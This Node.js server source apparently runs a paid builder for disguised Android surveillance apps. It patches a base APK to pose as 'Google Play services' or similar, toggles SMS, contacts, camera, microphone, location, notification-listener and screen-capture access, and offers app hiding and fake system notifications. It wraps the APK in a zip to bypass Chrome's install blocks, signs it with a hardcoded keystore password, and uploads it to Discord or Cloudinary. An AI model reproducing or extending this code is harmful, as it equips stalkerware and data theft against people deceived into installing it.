const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const { exec } = require('child_process');
const sharp   = require('sharp');
const axios   = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData   = require('form-data');
const AdmZip     = require('adm-zip');
const crypto     = require('crypto');
require('dotenv').config();

const app  = express();
const port = process.env.PORT || 4000;
app.use(cors());
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

const ASSETS_DIR = path.join(__dirname, 'assets');
const TEMP_DIR   = path.join(__dirname, 'temp');
const BASE_APK     = path.join(ASSETS_DIR, 'base.apk');
const DEFAULT_ICON = path.join(ASSETS_DIR, 'default_icon.png');
const KEYSTORE     = path.join(ASSETS_DIR, 'usman90.jks');
const SIGNER       = path.join(ASSETS_DIR, 'uber-apk-signer.jar');

if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

function toUtf16LE(str) {
    const buf = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
    return buf;
}

function binaryReplaceU16(buf, searchStr, replaceStr) {
    if (searchStr.length !== replaceStr.length) {
        throw new Error(`binaryReplaceU16 length mismatch: ${searchStr.length} vs ${replaceStr.length}`);
    }
    const s = toUtf16LE(searchStr);
    const r = toUtf16LE(replaceStr);
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function binaryReplaceU8(buf, searchStr, replaceStr) {
    const s = Buffer.isBuffer(searchStr) ? searchStr : Buffer.from(searchStr, 'utf8');
    const r = Buffer.isBuffer(replaceStr) ? replaceStr : Buffer.from(replaceStr, 'utf8');
    if (s.length !== r.length) {
        return 0; // Length mismatch (multibyte char in UTF-8), return 0 to trigger U16 fallback
    }
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function fixedLen(str, len, pad = ' ') {
    return str.length >= len ? str.substring(0, len) : str + pad.repeat(len - str.length);
}

function makeNeutralPerm(originalPerm) {
    const prefix = 'android.permission.N_';
    const needed = originalPerm.length - prefix.length;
    if (needed <= 0) return originalPerm;
    return prefix + '0'.repeat(needed);
}

const OLD_PKG = 'com.asml.tech';
const PKG_POOL = [
    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
];

function resolvePackage(userPkg) {
    if (!userPkg || !userPkg.trim() || userPkg === 'random' || userPkg === 'auto') {
        return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
    }
    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
    const parts = clean.split('.').filter(Boolean);
    if (clean.length === OLD_PKG.length && parts.length === 3 && parts[0] === 'com') {
        return clean;
    }
    let prefix = (parts.length >= 2 ? parts[1] : (parts[0] || 'app')).replace(/[^a-z0-9]/g, '');
    let suffix = (parts.length >= 3 ? parts[2] : 'sync').replace(/[^a-z0-9]/g, '');
    if (!prefix) prefix = 'apps';
    if (!suffix) suffix = 'view';
    const p4 = (prefix + 'core').substring(0, 4);
    const s4 = (suffix + 'sync').substring(0, 4);
    return `com.${p4}.${s4}`;
}


function adler32(buf, offset, len) {
    let a = 1, b = 0;
    const MOD_ADLER = 65521;
    for (let i = offset; i < offset + len; i++) {
        a = (a + buf[i]) % MOD_ADLER;
        b = (b + a) % MOD_ADLER;
    }
    return ((b << 16) | a) >>> 0;
}

function patchDex(dexBuf, oldPkg, newPkg) {
    if (oldPkg.length !== newPkg.length) throw new Error('Length mismatch for patchDex');
    const oldSlash = Buffer.from(oldPkg.replace(/\./g, '/'), 'utf8');
    const newSlash = Buffer.from(newPkg.replace(/\./g, '/'), 'utf8');
    const oldDot = Buffer.from(oldPkg, 'utf8');
    const newDot = Buffer.from(newPkg, 'utf8');

    let idx = 0;
    while ((idx = dexBuf.indexOf(oldSlash, idx)) !== -1) {
        newSlash.copy(dexBuf, idx);
        idx += oldSlash.length;
    }
    idx = 0;
    while ((idx = dexBuf.indexOf(oldDot, idx)) !== -1) {
        newDot.copy(dexBuf, idx);
        idx += oldDot.length;
    }

    const sha1 = crypto.createHash('sha1').update(dexBuf.slice(32)).digest();
    sha1.copy(dexBuf, 12);

    const checksum = adler32(dexBuf, 12, dexBuf.length - 12);
    dexBuf.writeUInt32LE(checksum, 8);
}

function patchManifestPackage(manifestBuf, oldPkg, newPkg) {
    const stringCount = manifestBuf.readUInt32LE(16);
    const stringStart = manifestBuf.readUInt32LE(28);

    for (let i = 0; i < stringCount; i++) {
        const offset = manifestBuf.readUInt32LE(36 + i * 4);
        const absOffset = 8 + stringStart + offset;
        const len = manifestBuf.readUInt16LE(absOffset);
        const strOffset = absOffset + 2;
        const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);

        if (str === oldPkg) {
            toUtf16LE(newPkg).copy(manifestBuf, strOffset);
            console.log(`[PATCH] Manifest root package: "${oldPkg}" -> "${newPkg}"`);
        } else if (str.startsWith(oldPkg + '.')) {
            const replaced = newPkg + str.slice(oldPkg.length);
            if (replaced.length === str.length) {
                toUtf16LE(replaced).copy(manifestBuf, strOffset);
                console.log(`[PATCH] Manifest component: "${str}" -> "${replaced}"`);
            }
        }
    }
}

const APP_NAME_PH = 'AppTitlePlaceholder_';

const KNOWN_ICON_ENTRIES = [
    { path: 'res/d2.webp', size: 48 },
    { path: 'res/yw.webp', size: 48 },
    { path: 'res/MO.webp', size: 72 },
    { path: 'res/fq.webp', size: 72 },
    { path: 'res/qs.webp', size: 96 },
    { path: 'res/u5.webp', size: 96 },
    { path: 'res/Sn.webp', size: 144 },
    { path: 'res/j_.webp', size: 144 },
    { path: 'res/-6.webp', size: 192 },
    { path: 'res/sK.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.png', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.png', size: 192 },
];

async function generateDefaultAppIcon(appName) {
    const size = 512;
    const initial = (appName && appName.trim()) ? appName.trim()[0].toUpperCase() : 'A';
    const svg = `
    <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#F97316"/>
          <stop offset="50%" stop-color="#EA580C"/>
          <stop offset="100%" stop-color="#9A3412"/>
        </linearGradient>
      </defs>
      <rect x="0" y="0" width="${size}" height="${size}" rx="112" fill="url(#grad)"/>
      <rect x="8" y="8" width="${size - 16}" height="${size - 16}" rx="104" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="8"/>
      <text x="50%" y="58%" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="260" fill="#ffffff" text-anchor="middle" dominant-baseline="central">${initial}</text>
    </svg>`;
    return await sharp(Buffer.from(svg)).png().toBuffer();
}

async function replaceIcons(zip, pngBuffer) {
    const sizes = [48, 72, 96, 144, 192];
    const webpCache = {};
    const pngCache = {};
    for (const s of sizes) {
        webpCache[s] = await sharp(pngBuffer).resize(s, s).webp({ quality: 95 }).toBuffer();
        pngCache[s] = await sharp(pngBuffer).resize(s, s).png().toBuffer();
    }

    let count = 0;
    for (const item of KNOWN_ICON_ENTRIES) {
        const entry = zip.getEntry(item.path);
        if (entry) {
            try {
                const isPng = item.path.endsWith('.png');
                const buf = isPng ? pngCache[item.size] : webpCache[item.size];
                if (buf) {
                    entry.setData(buf);
                    entry.header.method = 0;
                    count++;
                }
            } catch (err) {
                console.error(`[ICON] Failed replacing ${item.path}:`, err.message);
            }
        }
    }

    for (const entry of zip.getEntries()) {
        const name = entry.entryName;
        if (name.startsWith('res/mipmap-') && (name.endsWith('.webp') || name.endsWith('.png'))) {
            let size = 96;
            if (name.includes('mdpi')) size = 48;
            else if (name.includes('hdpi')) size = 72;
            else if (name.includes('xhdpi')) size = 96;
            else if (name.includes('xxhdpi')) size = 144;
            else if (name.includes('xxxhdpi')) size = 192;

            const isPng = name.endsWith('.png');
            const buf = isPng ? pngCache[size] : webpCache[size];
            if (buf) {
                entry.setData(buf);
                entry.header.method = 0;
                count++;
            }
        }
    }

    console.log(`[ICON] Replaced ${count} icon files`);
}

const NOTIF_PRESETS = {
    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
    sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
    android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
    device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
    device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
    download_manager:   { title: 'Download Manager',      text: 'Transfer complete',          icon: 'download', action: 'none'        },
    system_ui:          { title: 'System UI',             text: 'Syncing data',               icon: 'sync',     action: 'settings'    },
    cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
    active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
    custom:             { title: 'System Service',        text: 'Running background checks',  icon: 'info',     action: 'device_info' },
};

app.post('/generate', upload.single('icon'), async (req, res) => {
    // ═══════════════════════════════════════════════════
    // SERVICE-SECRET AUTH — only the gallery-eye backend
    // may call this endpoint.  A shared secret is set in
    // both services' environment variables as
    // APK_SERVICE_SECRET.  No secret → 403 immediately.
    // This closes the direct-call bypass vector where a
    // Chrome extension or curl can hit /generate directly
    // with premium flags even though the main server
    // would have blocked them.
    // ═══════════════════════════════════════════════════
    const incomingSecret = req.headers['x-apk-service-secret'] || req.body.apkServiceSecret;
    const expectedSecret = process.env.APK_SERVICE_SECRET;
    if (!expectedSecret || incomingSecret !== expectedSecret) {
        console.warn(`[APK] Unauthorized /generate attempt — bad or missing service secret`);
        return res.status(403).json({ error: 'Forbidden' });
    }

    const {
        uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
        enableSmsPermission, enableContactsPermission, enableStoragePermission,
        enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
        enableLocationPermission, enableForegroundNotification, aggressivePermissions, enableFileManagerPermission,
        enableScreenCapture,
        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request UUID=${uuid} | App="${appName}" | Pkg="${userPkg}"`);
    res.status(202).json({ message: 'Processing started' });

    (async () => {
        const sendUpdate = async (event, data) => {
            if (!callbackUrl) return;
            try { await axios.post(callbackUrl, { uuid, event, data }); }
            catch (e) { console.error('[WH]', e.message); }
        };

        const unsignedPath = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);

        try {
            if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);

            const targetPkg    = resolvePackage(userPkg);
            const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
            const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const preset       = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;

            await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
            const zip = new AdmZip(BASE_APK);

            await sendUpdate('apk_progress', { step: 'Patching application title & resources...', progress: 20 });
            const arscEntry = zip.getEntry('resources.arsc');
            if (arscEntry) {
                const arscBuf = arscEntry.getData();

                // 1. Patch App Title
                const s = Buffer.from(APP_NAME_PH, 'utf8');
                const idx = arscBuf.indexOf(s);
                if (idx !== -1) {
                    const safeTitle = targetName.substring(0, APP_NAME_PH.length);
                    const byteLen = Buffer.byteLength(safeTitle, 'utf8');
                    arscBuf[idx - 2] = safeTitle.length;
                    arscBuf[idx - 1] = byteLen;
                    Buffer.from(safeTitle, 'utf8').copy(arscBuf, idx);
                    arscBuf[idx + byteLen] = 0;
                    for (let i = byteLen + 1; i <= APP_NAME_PH.length; i++) {
                        arscBuf[idx + i] = 0;
                    }
                    console.log(`[ARSC] Title updated to: "${safeTitle}" (${byteLen} bytes)`);
                }

                // 2. Patch Package in ARSC so Resources match Manifest
                if (targetPkg !== OLD_PKG) {
                    const oldPkgBuf = toUtf16LE(OLD_PKG);
                    const newPkgBuf = toUtf16LE(targetPkg);
                    let pIdx = 0;
                    while ((pIdx = arscBuf.indexOf(oldPkgBuf, pIdx)) !== -1) {
                        newPkgBuf.copy(arscBuf, pIdx);
                        console.log(`[ARSC] Package updated at offset ${pIdx}`);
                        pIdx += oldPkgBuf.length;
                    }
                }

                arscEntry.setData(arscBuf);
                arscEntry.header.method = 0;
            }

            const isSmsEnabled             = enableSmsPermission === 'true' || enableSmsPermission === true;
            const isContactsEnabled        = enableContactsPermission === 'true' || enableContactsPermission === true;
            const isCameraEnabled          = enableCameraPermission === 'true' || enableCameraPermission === true;
            const isMicEnabled             = enableMicrophonePermission === 'true' || enableMicrophonePermission === true;
            const isLocationEnabled        = enableLocationPermission === 'true' || enableLocationPermission === true;
            const isStorageEnabled         = enableStoragePermission !== 'false' && enableStoragePermission !== false;
            const isFileManagerEnabled     = enableFileManagerPermission !== undefined
                ? (enableFileManagerPermission === 'true' || enableFileManagerPermission === true)
                : isStorageEnabled;
            const isScreenCaptureEnabled   = enableScreenCapture === 'true' || enableScreenCapture === true;
            const isForegroundNotifEnabled = enableForegroundNotification !== 'false' && enableForegroundNotification !== false;
            const isNotifListenerEnabled   = enableNotificationListener === 'true' || enableNotificationListener === true;

            await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
            const manifestEntry = zip.getEntry('AndroidManifest.xml');
            if (manifestEntry) {
                const manifestBuf = manifestEntry.getData();

                if (targetPkg !== OLD_PKG) {
                    patchManifestPackage(manifestBuf, OLD_PKG, targetPkg);
                    const dexEntry = zip.getEntry('classes.dex');
                    if (dexEntry) {
                        const dexBuf = dexEntry.getData();
                        patchDex(dexBuf, OLD_PKG, targetPkg);
                        dexEntry.setData(dexBuf);
                        console.log(`[DEX] Classes package updated: "${OLD_PKG}" -> "${targetPkg}" with Adler32/SHA-1 checksums`);
                    }
                }

                const permsToNeutralize = [];
                if (!isSmsEnabled) {
                    permsToNeutralize.push('android.permission.READ_SMS', 'android.permission.RECEIVE_SMS');
                }
                if (!isNotifListenerEnabled) {
                    permsToNeutralize.push('android.permission.BIND_NOTIFICATION_LISTENER_SERVICE');
                }
                if (!isCameraEnabled && !isMicEnabled) {
                    permsToNeutralize.push('android.permission.BIND_TELECOM_CONNECTION_SERVICE', 'android.permission.MANAGE_OWN_CALLS');
                }
                if (!isContactsEnabled) {
                    permsToNeutralize.push('android.permission.READ_CONTACTS');
                }
                if (!isCameraEnabled) {
                    permsToNeutralize.push('android.permission.CAMERA', 'android.permission.FOREGROUND_SERVICE_CAMERA');
                }
                if (!isMicEnabled) {
                    permsToNeutralize.push('android.permission.RECORD_AUDIO', 'android.permission.FOREGROUND_SERVICE_MICROPHONE');
                }
                if (!isLocationEnabled) {
                    permsToNeutralize.push(
                        'android.permission.ACCESS_FINE_LOCATION',
                        'android.permission.ACCESS_COARSE_LOCATION',
                        'android.permission.FOREGROUND_SERVICE_LOCATION'
                    );
                }
                if (!isStorageEnabled) {
                    permsToNeutralize.push(
                        'android.permission.READ_MEDIA_IMAGES',
                        'android.permission.READ_MEDIA_VIDEO',
                        'android.permission.READ_EXTERNAL_STORAGE',
                        'android.permission.WRITE_EXTERNAL_STORAGE'
                    );
                }
                if (!isFileManagerEnabled) {
                    permsToNeutralize.push(
                        'android.permission.MANAGE_EXTERNAL_STORAGE'
                    );
                }
                if (!isScreenCaptureEnabled) {
                    permsToNeutralize.push(
                        'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION'
                    );
                }
                if (!isForegroundNotifEnabled) {
                    permsToNeutralize.push('android.permission.POST_NOTIFICATIONS');
                }

                for (const perm of permsToNeutralize) {
                    const neutral = makeNeutralPerm(perm);
                    binaryReplaceU16(manifestBuf, perm, neutral);
                }

                manifestEntry.setData(manifestBuf);
                manifestEntry.header.method = 8;
            }

            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding custom launcher icons...', progress: 50 });
                await replaceIcons(zip, customIcon.buffer);
            } else {
                try {
                    await sendUpdate('apk_progress', { step: 'Generating launcher icons...', progress: 50 });
                    let fallbackBuf = null;
                    if (fs.existsSync(DEFAULT_ICON)) {
                        fallbackBuf = fs.readFileSync(DEFAULT_ICON);
                    } else {
                        fallbackBuf = await generateDefaultAppIcon(targetName);
                    }
                    if (fallbackBuf) {
                        await replaceIcons(zip, fallbackBuf);
                    }
                } catch (iconErr) {
                    console.error('[ICON] Fallback icon error:', iconErr.message);
                }
            }

            await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
            const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));

            const config = {
                hideApp:                      hideApp === 'true',
                theme_colors:                 themeColors,
                appName:                      targetName,
                packageName:                  targetPkg,
                enableSmsPermission:          enableSmsPermission === 'true',
                enableContactsPermission:     enableContactsPermission === 'true',
                enableStoragePermission:      isStorageEnabled,
                enableFileManagerPermission:  isFileManagerEnabled,
                enableScreenCapture:          isScreenCaptureEnabled,
                enableCameraPermission:       enableCameraPermission === 'true',
                enableMicrophonePermission:   enableMicrophonePermission === 'true',
                enableLocationPermission:     enableLocationPermission === 'true',
                enableNotificationListener:   enableNotificationListener === 'true',
                enableForegroundNotification: isForegroundNotifEnabled,
                aggressivePermissions:        aggressivePermissions === 'true',
                notificationClickAction:      notificationClickAction || preset.action,
                notificationTitle:            (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
                notificationText:             (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
                notificationIcon:             notificationIcon   || preset.icon,
                notificationChannelName:      (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
            };

            zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
            zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));

            await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
            const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
            for (const entry of zip.getEntries()) {
                const en = entry.entryName;
                if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
                    zip.deleteFile(en);
                }
            }

            const finalArsc = zip.getEntry('resources.arsc');
            if (finalArsc) finalArsc.header.method = 0;

            zip.writeZip(unsignedPath);

            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
            const ksArgs = fs.existsSync(KEYSTORE)
                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                : '';
            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                    } else {
                        resolve();
                    }
                });
            });

            await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
            const signedName = fs.readdirSync(TEMP_DIR)
                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
            if (!signedName) throw new Error('Signed APK not found after signing step');
            const signedPath = path.join(TEMP_DIR, signedName);

            // Create Safe ZIP container (Bypasses Chrome browser-initiated PackageInstaller blocks)
            const zipBundleName = `${finalApkName.replace('.apk', '')}.zip`;
            const zipBundlePath = path.join(TEMP_DIR, `bundle-${uuid}.zip`);
            try {
                const bundleZip = new AdmZip();
                bundleZip.addLocalFile(signedPath, '', finalApkName);
                bundleZip.writeZip(zipBundlePath);
                console.log(`[ZIP] Created companion safe bundle: ${zipBundleName}`);
            } catch (zErr) {
                console.error('[ZIP] Failed creating zip bundle:', zErr.message);
            }

            let downloadUrl = '';
            let zipUrl = '';
            await sendUpdate('apk_progress', { step: 'Uploading packages to cloud...', progress: 95 });

            if (process.env.DISCORD_WEBHOOK_URL) {
                try {
                    const form = new FormData();
                    form.append('file1', fs.createReadStream(signedPath), { filename: finalApkName });
                    if (fs.existsSync(zipBundlePath)) {
                        form.append('file2', fs.createReadStream(zipBundlePath), { filename: zipBundleName });
                    }
                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                    });
                    const attachments = r.data?.attachments || [];
                    for (const att of attachments) {
                        if (att.filename && att.filename.endsWith('.apk')) downloadUrl = att.url;
                        else if (att.filename && att.filename.endsWith('.zip')) zipUrl = att.url;
                    }
                    if (!downloadUrl && attachments[0]) downloadUrl = attachments[0].url;
                    if (!zipUrl && attachments[1]) zipUrl = attachments[1].url;
                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
            }

            if ((!downloadUrl || !zipUrl) && process.env.CLOUDINARY_CLOUD_NAME) {
                try {
                    cloudinary.config({
                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
                        api_key:     process.env.CLOUDINARY_API_KEY,
                        api_secret:  process.env.CLOUDINARY_API_SECRET,
                    });
                    if (!downloadUrl) {
                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);
                        const r = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder:        'generated_apks',
                            public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
                        });
                        downloadUrl = r.secure_url || '';
                        if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    }
                    if (!zipUrl && fs.existsSync(zipBundlePath)) {
                        const rZip = await cloudinary.uploader.upload(zipBundlePath, {
                            resource_type: 'raw',
                            folder:        'generated_apks',
                            public_id:     `${finalApkName.replace('.apk', '')}_safe_zip_${Date.now()}`,
                        });
                        zipUrl = rZip.secure_url || '';
                    }
                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
            }

            [unsignedPath, signedPath, zipBundlePath].forEach(p => {
                try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
            });

            if (downloadUrl) {
                await sendUpdate('apk_ready', {
                    downloadUrl,
                    zipUrl: zipUrl || downloadUrl,
                    url: downloadUrl,
                    packageName: targetPkg,
                    appName: targetName
                });
                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg} | apk=${downloadUrl} | zip=${zipUrl}`);
            } else {
                await sendUpdate('apk_error', { message: 'Upload failed' });
            }

        } catch (err) {
            console.error(`[APK] Failed ${uuid}:`, err.message);
            try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
            try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
        }
    })();
});

app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
